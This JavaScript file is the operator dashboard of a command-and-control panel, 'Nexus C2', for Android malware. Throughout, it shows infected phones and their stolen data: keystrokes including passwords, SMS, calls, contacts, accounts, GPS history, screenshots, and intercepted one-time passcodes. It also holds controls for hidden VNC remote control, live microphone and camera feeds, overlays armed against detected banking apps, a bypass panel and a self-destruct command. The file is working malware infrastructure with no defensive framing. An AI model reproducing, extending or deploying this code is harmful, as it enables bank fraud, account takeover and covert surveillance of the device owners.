'use strict';
// ═══════════════════════════════════════════════════════════════════════════
//  Nexus C2 — Dashboard v5
// ═══════════════════════════════════════════════════════════════════════════

// ── State ──────────────────────────────────────────────────────────────────
const S = {
  devices:     {},      // id → device obj
  selected:    null,    // selected device id
  activePane:  'devices',
  activeDevTab:'info',
  otps:        [],
  feed:        [],
  hvncViewer:  null,
  modalFn:     null,
};

// ── DOM shortcuts ──────────────────────────────────────────────────────────
const $  = (sel, ctx = document) => ctx.querySelector(sel);
const $$ = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];
const el = (tag, attrs = {}, ...ch) => {
  const e = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (k === 'class') e.className = v;
    else if (k.startsWith('on')) e.addEventListener(k.slice(2), v);
    else e.setAttribute(k, v);
  }
  for (const c of ch) e.appendChild(typeof c === 'string' ? document.createTextNode(c) : c);
  return e;
};

// ── Time helpers ──────────────────────────────────────────────────────────
const tsAgo = ts => {
  const s = Math.floor((Date.now() - ts * 1000) / 1000);
  if (s < 5)   return 'now';
  if (s < 60)  return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s/60)}m ago`;
  if (s < 86400) return `${Math.floor(s/3600)}h ago`;
  return `${Math.floor(s/86400)}d ago`;
};
const fmtTime = () => new Date().toLocaleTimeString('en', { hour12: false });

// ═══════════════════════════════════════════════════════════════════════════
//  WebSocket (from ws-client.js singleton)
// ═══════════════════════════════════════════════════════════════════════════
let WS = null;
function initWS() {
  const url = (location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws/operator';
  WS = new NexusWS(url, {
    onOpen:    ()    => connState('live'),
    onClose:   ()    => { connState('off'); schedReconnect(); },
    onBinary:  buf   => handleBinaryFrame(buf),
    onMessage: msg   => handleMessage(msg),
  });
}

function schedReconnect() {
  connState('conn');
  setTimeout(() => WS && WS.connect(), 3000);
}

function connState(s) {
  const dot = $('#conn-dot');
  if (!dot) return;
  dot.className = 'conn-dot' + (s === 'live' ? ' live' : s === 'conn' ? ' conn' : '');
  const lbl = $('#conn-label');
  if (lbl) lbl.textContent = s === 'live' ? 'Connected' : s === 'conn' ? 'Connecting…' : 'Offline';
}

function sendWS(obj) {
  if (WS) WS.sendJson(obj);
}

// ═══════════════════════════════════════════════════════════════════════════
//  Message router
// ═══════════════════════════════════════════════════════════════════════════
function handleMessage(msg) {
  switch (msg.type) {

    case 'init': {
      S.devices = {};
      for (const d of (msg.devices || [])) S.devices[d.id] = d;
      renderDeviceList();
      updateHeaderStats(msg.stats || {});
      break;
    }

    case 'device_online': {
      S.devices[msg.id] = { id: msg.id, online: true, info: msg.info || {}, ...(S.devices[msg.id] || {}) };
      S.devices[msg.id].online = true;
      renderDeviceList();
      addFeed('📲', msg.id, 'Device connected', 'green');
      updateHeaderOnline();
      break;
    }

    case 'device_offline': {
      if (S.devices[msg.id]) S.devices[msg.id].online = false;
      renderDeviceList();
      addFeed('🔴', msg.id, 'Device disconnected', 'red');
      updateHeaderOnline();
      break;
    }

    case 'device_update': {
      if (!S.devices[msg.id]) S.devices[msg.id] = { id: msg.id };
      Object.assign(S.devices[msg.id], msg.patch || {});
      if (msg.info) S.devices[msg.id].info = { ...S.devices[msg.id].info, ...msg.info };
      renderDeviceRow(msg.id);
      if (S.selected === msg.id) renderDeviceInfo(msg.id);
      break;
    }

    case 'device_deleted': {
      delete S.devices[msg.id];
      if (S.selected === msg.id) selectDevice(null);
      renderDeviceList();
      break;
    }

    case 'keylog': {
      if (S.selected === msg.id && S.activeDevTab === 'keylog') appendKeylog(msg.data);
      addFeed('⌨️', msg.id, `${msg.data?.app || '?'}: ${(msg.data?.text || '').slice(0, 60)}`);
      break;
    }

    case 'notification': {
      if (S.selected === msg.id && S.activeDevTab === 'notif') appendNotif(msg.data);
      addFeed('🔔', msg.id, `${msg.data?.app || ''}: ${msg.data?.title || ''}`);
      break;
    }

    case 'otp_intercepted': {
      addOTP(msg);
      updateBadge('nav-otp', ++S._otpCount);
      addFeed('🔑', msg.id, `OTP: ${msg.otp} (${msg.app})`, 'yellow');
      toast(`OTP from ${deviceName(msg.id)}: ${msg.otp}`, 'warn');
      break;
    }

    case 'screenshot_new': {
      if (S.selected === msg.id && S.activeDevTab === 'ss') loadScreenshots(msg.id);
      addFeed('📷', msg.id, 'New screenshot');
      break;
    }

    case 'sms_update': {
      if (S.selected === msg.id && S.activeDevTab === 'sms') loadSMS(msg.id);
      addFeed('💬', msg.id, `SMS updated (${msg.count})`);
      break;
    }

    case 'contacts_update': {
      if (S.selected === msg.id && S.activeDevTab === 'contacts') loadContacts(msg.id);
      break;
    }

    case 'calls_update': {
      if (S.selected === msg.id && S.activeDevTab === 'calls') loadCalls(msg.id);
      break;
    }

    case 'apps_update': {
      if (S.selected === msg.id && S.activeDevTab === 'apps') loadApps(msg.id);
      break;
    }

    case 'accounts_update': {
      if (S.selected === msg.id && S.activeDevTab === 'accounts') loadAccounts(msg.id);
      break;
    }

    case 'location_update': {
      if (S.selected === msg.id && S.activeDevTab === 'location') loadLocation(msg.id);
      addFeed('📍', msg.id, `${msg.lat?.toFixed(4)}, ${msg.lng?.toFixed(4)}`);
      break;
    }

    case 'mic_chunk': {
      // Forward to any live audio widget
      document.dispatchEvent(new CustomEvent('nx:mic', { detail: msg }));
      break;
    }

    case 'camera_frame': {
      document.dispatchEvent(new CustomEvent('nx:cam', { detail: msg }));
      break;
    }

    case 'detection_update': {
      if (S.devices[msg.id]) {
        S.devices[msg.id].fin_count    = msg.fin_count;
        S.devices[msg.id].social_count = msg.social_count;
      }
      renderDeviceRow(msg.id);
      if (msg.fin_count > 0)
        addFeed('💳', msg.id, `${msg.fin_count} financial app(s) detected`, 'yellow');
      break;
    }

    case 'overlays_auto_armed': {
      addFeed('🎭', msg.dev_id, `${msg.count} overlay(s) armed`);
      break;
    }

    case 'cmd_queued': {
      toast(`Cmd queued (device offline): ${msg.cmd}`, 'info');
      break;
    }

    case 'broadcast_ack': {
      toast(`Broadcast "${msg.cmd}" → ${msg.sent} device(s)`, 'success');
      break;
    }

    case 'event': {
      if (msg.evt !== 'heartbeat' && msg.evt !== 'pong')
        addFeed('⚡', msg.id, `${msg.evt}`);
      break;
    }


    case 'bypass_status': {
      if (typeof BypassPanel !== 'undefined') {
        document.dispatchEvent(new CustomEvent('nx:bypass', { detail: msg }));
        if (msg.data?.decoy_active != null) BypassPanel.updateLiveStats(msg.data);
      }
      break;
    }
    case 'bypass_update': {
      if (typeof BypassPanel !== 'undefined') BypassPanel.onWsMessage(msg);
      break;
    }
    case 'stats_tick': {
      updateHeaderStats(msg);
      break;
    }
  }
}

function handleBinaryFrame(buf) {
  if (S.hvncViewer) S.hvncViewer.pushFrame(buf);
}

// ═══════════════════════════════════════════════════════════════════════════
//  Device list
// ═══════════════════════════════════════════════════════════════════════════
function renderDeviceList() {
  const list = $('#dl-list');
  if (!list) return;
  const q = ($('#dl-search')?.value || '').toLowerCase();

  const sorted = Object.values(S.devices).sort((a, b) => {
    if (a.online !== b.online) return a.online ? -1 : 1;
    return (b.last_seen || 0) - (a.last_seen || 0);
  });

  // Filter
  const filtered = q
    ? sorted.filter(d =>
        deviceName(d.id).toLowerCase().includes(q) ||
        d.id.toLowerCase().includes(q) ||
        (d.info?.model || '').toLowerCase().includes(q) ||
        (d.info?.country || '').toLowerCase().includes(q)
      )
    : sorted;

  if (filtered.length === 0) {
    list.innerHTML = `<div class="empty-state"><div class="es-icon">📡</div><div class="es-text">No devices${q ? ' matching "' + q + '"' : ' connected yet'}</div></div>`;
    return;
  }

  // Diff-render: only update changed rows
  const existing = new Set([...list.querySelectorAll('.device-row')].map(r => r.dataset.id));
  const incoming = new Set(filtered.map(d => d.id));

  // Remove stale
  for (const id of existing) if (!incoming.has(id)) list.querySelector(`[data-id="${id}"]`)?.remove();

  for (const dev of filtered) {
    let row = list.querySelector(`[data-id="${dev.id}"]`);
    if (!row) {
      row = buildDeviceRow(dev);
      list.appendChild(row);
    } else {
      updateDeviceRowEl(row, dev);
    }
  }
}

function buildDeviceRow(dev) {
  const row = el('div', {
    class: 'device-row' + (S.selected === dev.id ? ' active' : ''),
    'data-id': dev.id,
    onclick: () => selectDevice(dev.id),
  });
  updateDeviceRowEl(row, dev);
  return row;
}

function updateDeviceRowEl(row, dev) {
  row.className = 'device-row' + (S.selected === dev.id ? ' active' : '');

  const info   = dev.info || {};
  const name   = dev.alias || info.model || info.brand || dev.id.slice(0, 8);
  const sub    = [info.android_version ? `Android ${info.android_version}` : null, info.country, dev.id.slice(0, 8)].filter(Boolean).join(' · ');
  const badges = [];
  if (dev.fin_count    > 0) badges.push(`<span class="tag fin">💳 ${dev.fin_count}</span>`);
  if (dev.social_count > 0) badges.push(`<span class="tag soc">💬 ${dev.social_count}</span>`);
  if (dev.vnc_active)       badges.push(`<span class="tag vnc-tag">👁</span>`);

  row.innerHTML = `
    <div class="dr-left"><div class="dot ${dev.online ? 'on' : 'off'}"></div></div>
    <div class="dr-info">
      <div class="dr-model">${esc(name)}</div>
      <div class="dr-sub">${esc(sub)}</div>
    </div>
    <div class="dr-right">
      <div class="dr-time">${dev.last_seen ? tsAgo(dev.last_seen) : ''}</div>
      <div class="dr-badges">${badges.join('')}</div>
    </div>`;
}

function renderDeviceRow(id) {
  const row = $('#dl-list')?.querySelector(`[data-id="${id}"]`);
  if (row && S.devices[id]) updateDeviceRowEl(row, S.devices[id]);
}

// ═══════════════════════════════════════════════════════════════════════════
//  Device selection & detail
// ═══════════════════════════════════════════════════════════════════════════
function selectDevice(id) {
  if (S.selected && S.hvncViewer) {
    sendWS({ type: 'vnc_unsubscribe', devId: S.selected });
    S.hvncViewer.destroy();
    S.hvncViewer = null;
  }
  S.selected = id;

  $$('.device-row').forEach(r => r.classList.toggle('active', r.dataset.id === id));

  const detail = $('#device-detail-col');
  if (!detail) return;

  if (!id) {
    detail.innerHTML = `<div class="empty-state" style="height:100%"><div class="es-icon">👈</div><div class="es-text">Select a device</div></div>`;
    return;
  }

  renderDeviceDetail(id);
}

function renderDeviceDetail(id) {
  const detail = $('#device-detail-col');
  const dev    = S.devices[id];
  if (!dev || !detail) return;

  const info = dev.info || {};
  const name = dev.alias || info.model || info.brand || id.slice(0, 8);

  detail.innerHTML = `
    <div id="dd-header">
      <div>
        <div id="dd-title" class="flex items-center gap-4">
          <div class="dot ${dev.online ? 'on' : 'off'}"></div>
          ${esc(name)}
        </div>
        <div id="dd-sub">${esc(id)}</div>
      </div>
      <div class="dd-actions" id="dd-actions"></div>
    </div>
    <div id="dd-tabs"></div>
    <div id="dd-content"></div>`;

  buildDetailActions(id);
  buildDetailTabs(id);
  switchDevTab(id, S.activeDevTab);
}

function buildDetailActions(id) {
  const wrap = $('#dd-actions');
  if (!wrap) return;
  const dev = S.devices[id];
  if (!dev) return;

  const btns = [
    { label: '📷 Snap',       fn: () => sendCmd(id, 'SNAP_SCREEN') },
    { label: '🖥 HVNC',       fn: () => startHVNC(id), cls: 'btn-primary' },
    { label: '🔓 Bypass',     fn: () => BypassPanel.open(id), cls: 'btn-warning' },
    { label: dev.online ? '💀 Kill' : '♻️ Revive',
      fn: () => sendCmd(id, dev.online ? 'SELF_DESTRUCT' : 'RECONNECT_CONNECTION'),
      cls: dev.online ? 'btn-danger' : 'btn-success' },
    { label: '🗑', fn: () => deleteDevice(id), cls: 'btn-ghost btn-icon' },
  ];

  for (const b of btns) {
    const btn = el('button', { class: `btn btn-sm ${b.cls || 'btn-ghost'}`, onclick: b.fn }, b.label);
    wrap.appendChild(btn);
  }
}

const DEV_TABS = [
  { id: 'info',     label: 'Info' },
  { id: 'cmd',      label: 'Commands' },
  { id: 'keylog',   label: 'Keylogs' },
  { id: 'sms',      label: 'SMS' },
  { id: 'calls',    label: 'Calls' },
  { id: 'contacts', label: 'Contacts' },
  { id: 'apps',     label: 'Apps' },
  { id: 'accounts', label: 'Accounts' },
  { id: 'location', label: 'Location' },
  { id: 'notif',    label: 'Notifications' },
  { id: 'ss',       label: 'Screenshots' },
];

function buildDetailTabs(id) {
  const tabs = $('#dd-tabs');
  if (!tabs) return;
  tabs.innerHTML = '';
  for (const t of DEV_TABS) {
    const tab = el('div', {
      class: 'dd-tab' + (S.activeDevTab === t.id ? ' active' : ''),
      'data-tab': t.id,
      onclick: () => switchDevTab(id, t.id),
    }, t.label);
    tabs.appendChild(tab);
  }
}

function switchDevTab(id, tabId) {
  S.activeDevTab = tabId;
  $$('#dd-tabs .dd-tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tabId));

  const content = $('#dd-content');
  if (!content) return;
  content.innerHTML = `<div class="dd-panel active" id="dd-panel-${tabId}" style="flex:1;overflow:auto;"></div>`;

  const panel = $(`#dd-panel-${tabId}`);

  switch (tabId) {
    case 'info':     renderDeviceInfo(id, panel);     break;
    case 'cmd':      renderCmdPanel(id, panel);        break;
    case 'keylog':   loadKeylogsPanel(id, panel);      break;
    case 'sms':      loadSMS(id, panel);               break;
    case 'calls':    loadCalls(id, panel);             break;
    case 'contacts': loadContacts(id, panel);          break;
    case 'apps':     loadApps(id, panel);              break;
    case 'accounts': loadAccounts(id, panel);          break;
    case 'location': loadLocation(id, panel);          break;
    case 'notif':    loadNotifications(id, panel);     break;
    case 'ss':       loadScreenshots(id, panel);       break;
  }
}

// ── Info tab ───────────────────────────────────────────────────────────────
function renderDeviceInfo(id, panel) {
  panel = panel || $('#dd-content');
  const dev  = S.devices[id];
  if (!dev) return;
  const info = dev.info || {};

  const rows = [
    ['ID',          id],
    ['Alias',       dev.alias || '—'],
    ['Model',       info.model || info.brand || '—'],
    ['Android',     info.android_version ? `Android ${info.android_version} (API ${info.sdk || '?'})` : '—'],
    ['CPU ABI',     info.abi || info.cpu_abi || '—'],
    ['Screen',      info.screen_w && info.screen_h ? `${info.screen_w}×${info.screen_h}` : '—'],
    ['Language',    info.language || '—'],
    ['Country',     info.country || '—'],
    ['Carrier',     info.carrier || '—'],
    ['IMEI',        info.imei || '—'],
    ['IP',          info.ip || info.local_ip || '—'],
    ['Battery',     info.battery != null ? `${info.battery}%` : '—'],
    ['Rooted',      info.rooted != null ? (info.rooted ? '✅ Yes' : '❌ No') : '—'],
    ['Accessibility', info.accessibility ? '✅ Active' : '—'],
    ['Admin',       info.device_admin ? '✅ Yes' : '—'],
    ['First seen',  dev.first_seen ? new Date(dev.first_seen * 1000).toLocaleString() : '—'],
    ['Last seen',   dev.last_seen  ? new Date(dev.last_seen  * 1000).toLocaleString() : '—'],
    ['Fin apps',    dev.fin_count    || 0],
    ['Social apps', dev.social_count || 0],
  ];

  let html = '<div class="p-14"><table class="nx-table">';
  for (const [k, v] of rows)
    html += `<tr><td class="text-dim" style="width:130px">${k}</td><td class="mono">${esc(String(v))}</td></tr>`;
  html += '</table>';

  // Edit alias
  html += `<div class="form-group" style="margin-top:14px">
    <label class="form-label">Set Alias</label>
    <div class="flex gap-8">
      <input class="form-input" id="alias-input" value="${esc(dev.alias || '')}" placeholder="Friendly name…">
      <button class="btn btn-primary btn-sm" onclick="setAlias('${id}')">Save</button>
    </div>
  </div></div>`;

  if (panel) panel.innerHTML = html;
}

// ── Commands tab ───────────────────────────────────────────────────────────
function renderCmdPanel(id, panel) {
  if (!panel) return;

  let html = `<div style="padding:12px 14px;border-bottom:1px solid var(--border);display:flex;gap:8px;flex-wrap:wrap;align-items:center">
    <input id="cmd-search" class="form-input" style="width:200px" placeholder="Filter commands…" oninput="filterCmds(this.value)">
    <input id="quick-cmd" class="form-input" style="width:140px;font-family:var(--font-mono)" placeholder="cmd name">
    <input id="quick-args" class="form-input" style="width:200px;font-family:var(--font-mono)" placeholder='{"key":"val"}'>
    <button class="btn btn-primary btn-sm" onclick="quickSend('${id}')">Send</button>
    <button class="btn btn-ghost btn-sm" onclick="broadcastDialog()">📡 Broadcast</button>
  </div>
  <div id="cmd-grid" class="overflow-auto" style="flex:1;padding:12px;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px;align-content:start">`;

  for (const cat of CMD_CATALOG) {
    html += `<div class="cmd-cat">
      <div class="cmd-cat-header" style="color:${cat.color}">${cat.icon} ${cat.cat}</div>
      <div class="cmd-list">`;
    for (const c of cat.cmds) {
      const hasArgs = c.args && c.args.length > 0;
      html += `<div class="cmd-item" onclick="${hasArgs ? `openCmdModal('${id}','${c.cmd}')` : `sendCmd('${id}','${c.cmd}')`}">
        <div class="ci-dot" style="background:${cat.color}"></div>
        <span>${c.label || c.cmd}</span>
        ${hasArgs ? '<span style="color:var(--text-3);font-size:10px;margin-left:auto">⚙</span>' : ''}
      </div>`;
    }
    html += `</div></div>`;
  }
  html += '</div>';
  panel.innerHTML = html;
  panel.style.display = 'flex';
  panel.style.flexDirection = 'column';
  panel.style.overflow = 'hidden';
}

window.filterCmds = q => {
  q = q.toLowerCase();
  $$('#cmd-grid .cmd-item').forEach(item => {
    item.style.display = (!q || item.textContent.toLowerCase().includes(q)) ? '' : 'none';
  });
  $$('#cmd-grid .cmd-cat').forEach(cat => {
    const anyVisible = [...cat.querySelectorAll('.cmd-item')].some(i => i.style.display !== 'none');
    cat.style.display = anyVisible ? '' : 'none';
  });
};

window.quickSend = id => {
  const cmd  = $('#quick-cmd')?.value?.trim();
  const args = $('#quick-args')?.value?.trim();
  if (!cmd) return;
  let parsed = {};
  if (args) try { parsed = JSON.parse(args); } catch { toast('Args JSON invalid', 'error'); return; }
  sendCmd(id, cmd, parsed);
};

// ── Keylogs tab ────────────────────────────────────────────────────────────
async function loadKeylogsPanel(id, panel) {
  if (!panel) panel = $(`#dd-panel-keylog`);
  if (!panel) return;
  panel.innerHTML = '<div class="empty-state"><div class="es-icon">⏳</div></div>';

  try {
    const rows = await api(`/api/devices/${id}/keylogs?limit=500`);
    if (!rows.length) { panel.innerHTML = '<div class="empty-state"><div class="es-icon">⌨️</div><div class="es-text">No keylogs yet</div></div>'; return; }

    let html = '<div style="flex:1;overflow:auto">';
    for (const r of rows) {
      html += `<div class="kl-entry${r.is_password ? ' kl-pass' : ''}">
        <span class="kl-ts">${fmtTs(r.ts)}</span>
        <span class="kl-app">${esc(r.app || r.pkg || '?')}</span>
        <span class="kl-text">${r.is_password ? '●'.repeat(Math.min((r.text||'').length, 16)) : esc(r.text || '')}</span>
      </div>`;
    }
    html += '</div>';
    panel.innerHTML = html;
  } catch (e) { panel.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
}

function appendKeylog(data) {
  const panel = $(`#dd-panel-keylog`);
  if (!panel) return;
  const entry = el('div', { class: `kl-entry${data.is_password ? ' kl-pass' : ''}` });
  entry.innerHTML = `<span class="kl-ts">${fmtTime()}</span><span class="kl-app">${esc(data.app || '?')}</span><span class="kl-text">${data.is_password ? '●●●●' : esc(data.text || '')}</span>`;
  panel.querySelector('div')?.prepend(entry);
}

// ── SMS tab ────────────────────────────────────────────────────────────────
async function loadSMS(id, panel) {
  panel = panel || $(`#dd-panel-sms`);
  if (!panel) return;
  loadTableFromApi(panel, `/api/devices/${id}/sms`, r => {
    const list = Array.isArray(r?.data) ? r.data : [];
    if (!list.length) return null;
    const headers = ['From/To', 'Body', 'Date', 'Type'];
    const rows = list.slice(0, 300).map(s => [
      esc(s.address || s.from || '?'),
      esc((s.body || s.text || '').slice(0, 120)),
      fmtTs(s.date ? Math.floor(s.date/1000) : null),
      s.type == 1 ? 'Inbox' : s.type == 2 ? 'Sent' : s.type || '?',
    ]);
    return { headers, rows };
  });
}

// ── Calls tab ──────────────────────────────────────────────────────────────
async function loadCalls(id, panel) {
  panel = panel || $(`#dd-panel-calls`);
  if (!panel) return;
  loadTableFromApi(panel, `/api/devices/${id}/calls`, r => {
    const list = Array.isArray(r?.data) ? r.data : [];
    if (!list.length) return null;
    const typeMap = { 1: '📥 Incoming', 2: '📤 Outgoing', 3: '❌ Missed', 5: '🔇 Rejected' };
    const headers = ['Number', 'Name', 'Duration', 'Date', 'Type'];
    const rows = list.slice(0, 300).map(c => [
      esc(c.number || c.phone_no || '?'),
      esc(c.name || '—'),
      `${c.duration || 0}s`,
      fmtTs(c.date ? Math.floor(c.date/1000) : null),
      typeMap[c.type] || String(c.type || '?'),
    ]);
    return { headers, rows };
  });
}

// ── Contacts tab ────────────────────────────────────────────────────────────
async function loadContacts(id, panel) {
  panel = panel || $(`#dd-panel-contacts`);
  if (!panel) return;
  loadTableFromApi(panel, `/api/devices/${id}/contacts`, r => {
    const list = Array.isArray(r?.data) ? r.data : [];
    if (!list.length) return null;
    const headers = ['Name', 'Phone', 'Email'];
    const rows = list.slice(0, 500).map(c => [
      esc(c.name || c.display_name || '?'),
      esc(c.phone || c.number || '—'),
      esc(c.email || '—'),
    ]);
    return { headers, rows };
  });
}

// ── Apps tab ───────────────────────────────────────────────────────────────
async function loadApps(id, panel) {
  panel = panel || $(`#dd-panel-apps`);
  if (!panel) return;
  loadTableFromApi(panel, `/api/devices/${id}/apps`, r => {
    const list = Array.isArray(r?.data) ? r.data : [];
    if (!list.length) return null;
    const headers = ['App Name', 'Package', 'System'];
    const rows = list.slice(0, 500).map(a => [
      esc(a.name || a.label || '?'),
      esc(a.package || a.packageName || '—'),
      a.system ? '⚙' : '—',
    ]);
    return { headers, rows };
  });
}

// ── Accounts tab ───────────────────────────────────────────────────────────
async function loadAccounts(id, panel) {
  panel = panel || $(`#dd-panel-accounts`);
  if (!panel) return;
  loadTableFromApi(panel, `/api/devices/${id}/accounts`, r => {
    const list = Array.isArray(r?.data) ? r.data : [];
    if (!list.length) return null;
    const headers = ['Email / Account', 'Type'];
    const rows = list.slice(0, 200).map(a => [
      esc(a.name || a.email || a.account || '?'),
      esc(a.type || a.accountType || '—'),
    ]);
    return { headers, rows };
  });
}

// ── Location tab ───────────────────────────────────────────────────────────
async function loadLocation(id, panel) {
  panel = panel || $(`#dd-panel-location`);
  if (!panel) return;
  try {
    const rows = await api(`/api/devices/${id}/location`);
    if (!rows.length) { panel.innerHTML = '<div class="empty-state"><div class="es-icon">📍</div><div class="es-text">No location data</div></div>'; return; }
    const last = rows[0];
    const mapUrl = `https://www.openstreetmap.org/?mlat=${last.lat}&mlon=${last.lng}#map=15/${last.lat}/${last.lng}`;
    let html = `<div class="p-14">
      <div class="card" style="margin-bottom:12px;padding:12px 14px">
        <div class="flex gap-8" style="flex-wrap:wrap">
          <div><div class="text-dim" style="font-size:10px">LAT</div><div class="mono">${last.lat.toFixed(6)}</div></div>
          <div><div class="text-dim" style="font-size:10px">LNG</div><div class="mono">${last.lng.toFixed(6)}</div></div>
          ${last.accuracy ? `<div><div class="text-dim" style="font-size:10px">ACCURACY</div><div>${last.accuracy}m</div></div>` : ''}
          ${last.address  ? `<div><div class="text-dim" style="font-size:10px">ADDRESS</div><div>${esc(last.address)}</div></div>` : ''}
        </div>
        <div style="margin-top:10px;display:flex;gap:8px">
          <a href="${mapUrl}" target="_blank" class="btn btn-primary btn-sm" style="text-decoration:none">🗺 Open Map</a>
          <button class="btn btn-ghost btn-sm" onclick="sendCmd('${id}','GET_LOCATION')">🔄 Refresh</button>
        </div>
      </div>
      <table class="nx-table">
        <thead><tr><th>Time</th><th>Lat</th><th>Lng</th><th>Accuracy</th></tr></thead>
        <tbody>`;
    for (const r of rows.slice(0, 50))
      html += `<tr><td>${fmtTs(r.ts)}</td><td class="mono">${r.lat.toFixed(6)}</td><td class="mono">${r.lng.toFixed(6)}</td><td>${r.accuracy ? r.accuracy + 'm' : '—'}</td></tr>`;
    html += '</tbody></table></div>';
    panel.innerHTML = html;
  } catch (e) { panel.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
}

// ── Notifications tab ──────────────────────────────────────────────────────
async function loadNotifications(id, panel) {
  panel = panel || $(`#dd-panel-notif`);
  if (!panel) return;
  try {
    const rows = await api(`/api/notifications?dev_id=${id}&limit=200`);
    if (!rows.length) { panel.innerHTML = '<div class="empty-state"><div class="es-icon">🔔</div><div class="es-text">No notifications</div></div>'; return; }
    let html = '<div style="overflow:auto;flex:1"><table class="nx-table"><thead><tr><th>Time</th><th>App</th><th>Title</th><th>Text</th><th>OTP</th></tr></thead><tbody>';
    for (const r of rows)
      html += `<tr${r.is_otp ? ' style="background:rgba(224,184,74,0.05)"' : ''}>
        <td>${fmtTs(r.ts)}</td>
        <td>${esc(r.app || '?')}</td>
        <td>${esc(r.title || '')}</td>
        <td class="truncate" style="max-width:200px">${esc(r.text || '')}</td>
        <td>${r.is_otp ? `<span class="text-yellow mono">${esc(r.otp_code || '')}</span>` : ''}</td>
      </tr>`;
    html += '</tbody></table></div>';
    panel.innerHTML = html;
  } catch (e) { panel.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
}

function appendNotif(data) {
  // Live append handled in loadNotifications refresh
}

// ── Screenshots tab ────────────────────────────────────────────────────────
async function loadScreenshots(id, panel) {
  panel = panel || $(`#dd-panel-ss`);
  if (!panel) return;
  try {
    const rows = await api(`/api/screenshots?dev_id=${id}`);
    if (!rows.length) { panel.innerHTML = '<div class="empty-state"><div class="es-icon">📷</div><div class="es-text">No screenshots</div></div>'; return; }
    let html = '<div id="ss-grid">';
    for (const r of rows)
      html += `<div class="ss-thumb" onclick="viewScreenshot(${r.id})">
        <img src="/api/screenshots/${r.id}/thumb" onerror="this.style.display='none'" loading="lazy">
        <div class="ss-ts">${fmtTs(r.ts)}</div>
      </div>`;
    html += '</div>';
    panel.innerHTML = html;
  } catch (e) { panel.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`; }
}

window.viewScreenshot = async id => {
  try {
    const r = await api(`/api/screenshots/${id}`);
    openModal('Screenshot', `<img src="${r.data}" style="max-width:100%;border-radius:6px">`, [
      { label: '⬇ Download', cls: 'btn-primary', fn: () => { const a = document.createElement('a'); a.href = r.data; a.download = `ss_${id}.jpg`; a.click(); } },
      { label: '🗑 Delete', cls: 'btn-danger', fn: async () => { await api(`/api/screenshots/${id}`, 'DELETE'); closeModal(); loadScreenshots(S.selected); } },
    ]);
  } catch (e) { toast(e.message, 'error'); }
};

// ── Shared table loader ────────────────────────────────────────────────────
async function loadTableFromApi(panel, url, transform) {
  panel.innerHTML = '<div class="empty-state"><div class="es-icon">⏳</div></div>';
  try {
    const data = await api(url);
    const result = transform(data);
    if (!result) { panel.innerHTML = '<div class="empty-state"><div class="es-icon">📭</div><div class="es-text">No data</div></div>'; return; }
    let html = '<div style="overflow:auto;flex:1"><table class="nx-table"><thead><tr>';
    for (const h of result.headers) html += `<th>${h}</th>`;
    html += '</tr></thead><tbody>';
    for (const row of result.rows) html += '<tr>' + row.map(c => `<td>${c}</td>`).join('') + '</tr>';
    html += '</tbody></table></div>';
    panel.innerHTML = html;
  } catch (e) {
    panel.innerHTML = `<div class="empty-state"><div class="es-text text-red">${e.message}</div></div>`;
  }
}

// ═══════════════════════════════════════════════════════════════════════════
//  HVNC
// ═══════════════════════════════════════════════════════════════════════════
function startHVNC(id) {
  switchPane('hvnc');
  const inner = $('#hvnc-inner');
  if (!inner) return;

  if (S.hvncViewer) {
    S.hvncViewer.destroy();
    S.hvncViewer = null;
  }

  const dev = S.devices[id] || {};
  const info = dev.info || {};
  S.hvncViewer = new HVNCViewer(inner, id, sendWS, {
    frameW:  info.hvnc_w  || 360,
    frameH:  info.hvnc_h  || 720,
    screenW: info.screen_w || 1080,
    screenH: info.screen_h || 1920,
  });

  sendWS({ type: 'vnc_subscribe', devId: id });
  const hdr = $('#hvnc-pane-header');
  if (hdr) hdr.textContent = `HVNC — ${deviceName(id)}`;
}

function stopHVNC() {
  if (S.selected) sendWS({ type: 'vnc_unsubscribe', devId: S.selected });
  if (S.hvncViewer) { S.hvncViewer.destroy(); S.hvncViewer = null; }
  switchPane('devices');
}

// ═══════════════════════════════════════════════════════════════════════════
//  OTP pane
// ═══════════════════════════════════════════════════════════════════════════
function addOTP(msg) {
  S.otps.unshift(msg);
  if (S.activePane !== 'otp') return;
  renderOTPPane();
}

function renderOTPPane() {
  const pane = $('#otp-pane');
  if (!pane) return;
  if (!S.otps.length) {
    pane.innerHTML = '<div class="empty-state" style="height:100%"><div class="es-icon">🔑</div><div class="es-text">No OTPs intercepted yet</div></div>';
    return;
  }
  pane.innerHTML = S.otps.slice(0, 100).map(o => `
    <div class="otp-card">
      <div class="otp-code">${esc(o.otp)}</div>
      <div class="otp-meta">
        <div class="otp-app">${esc(o.app || '?')} ${o.title ? '· ' + esc(o.title) : ''}</div>
        <div class="otp-dev">${deviceName(o.id || o.dev_id)}</div>
        <div class="otp-ts">${fmtTime()}</div>
      </div>
      <button class="otp-copy" onclick="copyText('${esc(o.otp)}')">Copy</button>
    </div>`).join('');
}

// ═══════════════════════════════════════════════════════════════════════════
//  Feed pane
// ═══════════════════════════════════════════════════════════════════════════
function addFeed(icon, devId, text, color) {
  S.feed.unshift({ icon, devId, text, color, ts: fmtTime() });
  if (S.feed.length > 200) S.feed.pop();
  if (S.activePane !== 'feed') return;
  const list = $('#feed-list');
  if (!list) return;
  const item = el('div', { class: 'feed-item' });
  item.innerHTML = `<span class="feed-ts">${fmtTime()}</span><span class="feed-dev">${esc(deviceName(devId))}</span><span class="feed-icon">${icon}</span><span class="feed-text">${esc(text)}</span>`;
  list.prepend(item);
  if (list.children.length > 100) list.lastElementChild?.remove();
}

function renderFeedPane() {
  const list = $('#feed-list');
  if (!list) return;
  list.innerHTML = S.feed.slice(0, 100).map(f =>
    `<div class="feed-item"><span class="feed-ts">${f.ts}</span><span class="feed-dev">${esc(deviceName(f.devId))}</span><span class="feed-icon">${f.icon}</span><span class="feed-text">${esc(f.text)}</span></div>`
  ).join('');
}

// ═══════════════════════════════════════════════════════════════════════════
